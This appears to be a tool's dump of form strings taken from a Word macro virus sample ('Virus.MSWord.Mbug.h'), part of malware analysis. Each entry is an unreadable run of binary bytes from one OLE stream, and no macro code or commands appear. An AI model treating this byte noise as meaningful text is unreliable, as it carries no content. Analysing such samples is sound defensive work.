VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)XFm<<?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)3#))%9199)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)%99)91)BBBRJJRPZm^Rcccck^gcckk^gZKU
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)JJRxcsiiqiiqk^gum�iiqkkk^gsemJBJ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B/VcckcckkkcckcZk^RcZKU^RccckgZscckiiq���ܴ����991<.<R9B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
41l&-�.D�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n99{GF�1?�`b�{{҈�ص��ƨ�ew�#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)%9)!)1)B9999999999)99)9F-=999JBBJ99JBBJBB�o����ƫ�������~��ew�~��~�Ϟ��~�Ϟ�֞�֞��µ������������������ధʝ��~��]i�)Bo
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`.D�DL�N]�{{Ҟ��xw�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
23#)3#)<.<3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1JJZkVc)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
23#)199)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)..9199J9RJBJPZmZKU^Rc[ZlZKU^RcPZm^Rc9)9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)B/Vccckkxcskkkkk^gkkk^giiqJJR
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2cRkiiqcckiiqk^gcZkZKUPZm^RccckcZkcck�o|ҧ���ɫ��)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
XFmRBJ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)99{9I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"~+)�1E�$3�1?������ۈ�ص��LHk
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B)!)3#)9)9999999999F-=999B9BB9BJBBJBBJBBB9BJJR���������޸�ƫ�~�ϔ�ޛ�Ǟ�֞�ֵ�ⵯ�̹����̹䵯Ⱗʵ�➟�9I�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1-X�o�ZKU9)9')-
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!))!))%9991)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)3#)3.DBBRJJRJJR^Rc^Rc^RcNPTJJZJBJJJR[Zl
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1)BJJRkkum�kkk^gsemiiqiiqiiq[Zl!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^Rckkiiq[ZlccccZkJJRPZmJJR^RcJJRiiqiiq��������ɉmn!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�o|RBJ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"~%)o##X!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"~GF�`b�iu͙�ۣ��xw�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B)!))%91)B9999999)9999F-=B9BB9BB9BJBBJBBJBBB9Bt_�ƫ�ӻ̛�ǔ�ޛ��~�Ϟ�֛�ǔ�ޞ�֞�֛��~��]i�.3~+)�1?�AK�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J�~�wosZKUBBR<.<)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!))!))!)3#))!))!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1)B1999)9BBRJJRZKU^RcJJZ3=TJBB)%9<.<JJZRBJ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)%9BBRiiqkkk^giiqkkk^gum�semiiq3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
199iiqiiqiiq^Rc[ZlZKU[Zl>FXJJRZKUPZmcZk�o|ҧ����ܴ�eYV!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!���^Rc1)B##X##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N+)�GF�`b�`bǵ�㛟�##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1)%93#)3.D9999999)9F-=BB9B9BJBBJBBJBBJBBB9BJBBJ9R�~�̹䦛�ew�ew�Xe�Xe�dt�ew�Xe�Xe�GF�)Bo
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"~&-�FV�)Bo
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1t_����k^gk^gJJRB9B1993#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!))!))%9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)3.D99JJ9JJJRJJR^RcJJRJBJ3.+#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=)%9B9BcRk)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)%999J^Rck^gk^giiqk^g{u~{u~wosum�B9B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)^RciiqcckcckXFmJJR[ZlJJRNPTJJRPZm^Rciiq���ܴ����ܴ�3#)R9B���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"~&-�TZ���ۙ��GF�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B)!)#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=<.<999999999999F-=BB9B9BJBBJBBJBBJBBJBBJBBLHk���ƫ�~��K[�.?�.?�4En%-s)5s!1k!1k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)^!1k!1k%)o&-�1E�9L�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1XFm����~woscck^RcRBB<.<)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!))%9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!))%999JBBRJJRNPTJBB9)93.D3#)$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#)>FXJJR
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)%9J9R^RckVciiqiiqk^gkksemum�iiq991
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BBRiiqcRk[ZlJJRJJR>FXNPTZKU[ZlJJR[ZlZKU��ҧ�ܴ���ɹ��!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!�o|ܴ����ҧ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n1?�������}r�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!N'&D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B)!))!)1)B1)B9999999999)9BB9F-=B9BJBBJBBJBBJBBJBBJBBJBBLHk�~����}��K[�%-s5:k)Bo)5s%-s!1k!1k!1k!1k%-s&-�&-�1E�%-s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!##X������wosk^gcRkJJRJ99991)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)199B9BJBBJJRJ9R3.D999)%9)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1)B^RcB9B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
))%999JJJRiiqkkiiqgZsccckk{^ccZk3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)ZKUkVccZkkVccRk[ZlJBJ3=T[ZlJJRNPTcZkkVc���ܴ������ɉmn=-1��������⫌�#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N99{AK�iu͵��PZm)%9#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1)!)#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=1)B1999)9999999F-=B9B9)9B9BBB9JBBB9BJBBB9BJBBJBBJBBJJRiiqxw����]i�.3~)5s)5s)5s)5s!1k!1k!1k!1k%)o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"~%)o+)�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9t_����k^gk^gNPTJJRJBB1)B3#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)..93.D99J3.D1991)B))!)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!3#)B9JJJR)%9)!)3#)B9BJJRcZkiiqkkcckiiqkkum�ZKU199
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
JBJiiq[Zl[Zl^Rcccc^RcJJZBBR>FXZKU^RccZk�~�ܴ����������RBBB/Vܴ������ɉmn
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B%)o1-X99{&-�9L�{{ҙ��dt�B/V#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)!))%91999999999999)9999J99B9BB9BJBBJBBJBBJBBJBBJBBJBBOGGJBB^Rckk}��fs�K[�5:k4En%-s)Bo%-s!1k!1k!1k!1k!1k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!41l���k^gJJRJBBJJRJBB<.<')-!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!)9993.+3#)3.+3#)..9)!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1)BJJRJBJ')-3#)1)BJJR^Rciiqiiqk^giiqiiqiiqiiqB9J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)%9[Zlk^gcRkJJRPZmJJR^Rc99J99JJ9RJJRPZmkVc�����������ɹ��)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
sZcܴ����ҧ�B9B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BGF�1?�AK�DL�N]���ی��99{1)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B)!)1)B9999)99999999)9991B9BB9BJBBJBBJBBB9BJBBJBBJBBOGGOGGOGGJBBJBBN?Vkk���xw�LY�9I�99{19c!1k!1k'1Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9}r�k^g999JBBB9JB9B3#))!)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!))!)1)B3#))!))%9)!))!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)%9BBR^Rc1993#)1)B99JJJZcckiiqcZkcckk^giiqcckiiq1%1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!^RciiqcZk^RcBMkJJRNPTJJRNPT1)B>FXZKUiiq��������������ɉmn3#)sem�~������1)B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B##X+)�+)�1?�}r�1-X1)B1)B##X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9)%91)B999999999999B9BF-=BB99)9BB9JBBJBBJBBJBBJBBJBBJBBJBBJBBJBBJBBB9BJ9R�o����������K[�5:k)Bo'1Y%)o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)^!1k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)%9D;D���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9##Xk^g<.<!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1)BB9B1)B!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!))!)1)B199')-)!)!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!)3.DPZmJ9J)%91)BJBJJJRk^giiqiiqcckiiqcckcckk^gJBJ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BBR[Zlcck^RcJJRNPTJJRJJZJJRJJR<.<JBJPZmkkܴ�������������BB9J99ZKUOGG�mniiq!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z&-�N]�LHk99999J1)B#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=)%91)B9)99999)99)9F-=9)9B9BB9BJBBJBBJBBJBBJBBJBBJBBJBBOGGOGGJBBJBBJBBJBBZKULHkxw�ƫ͝��LY�9I�)Bo'1Y!1k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)3#)JBJTDL���

#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9LHkJ9R!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)!))%93#)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!)!))!))%9!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Mbug.h' - OLE stream: 'Macros/UserForm1/o'
